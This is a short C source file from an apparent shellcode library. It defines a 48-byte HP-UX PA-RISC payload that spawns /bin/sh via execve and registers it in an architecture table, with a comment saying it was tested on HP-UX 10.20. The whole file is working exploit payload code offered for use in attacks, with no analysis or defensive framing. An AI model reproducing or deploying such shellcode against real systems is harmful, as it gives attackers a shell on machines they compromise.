
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include "shellcode.h"
#include "hppa.h"


/* tested on:	HP-UX B.10.20 A 9000/735
 * lsd people used execv, we use execve, which enlarges our code by 12
 * bytes
 */
shellcode  	hppa_hpux_execvesh = {
	"hppa-hpux-execvesh",
	48,
	"\xeb\x5f\x1f\xfd\xb4\x16\x70\x76\xb7\x5a\x40\x3a"
	"\x0f\xc0\x12\x88\x0f\xda\x12\x80\x0b\xc0\x02\x99"
	"\x0b\x18\x02\x98\x22\xa0\x08\x01\xe6\xa0\xe0\x08"
	"\x0f\x40\x12\x0e\x2f\x62\x69\x6e\x2f\x73\x68\x41",
};


shellcode *	hppa_hpux_shellcodes[] = {
	&hppa_hpux_execvesh,
	NULL,
};

arch 	hppa_hpux = {
	"hppa-hpux",
	4,
	NULL /* hppa_nop */,
	hppa_hpux_shellcodes,
};



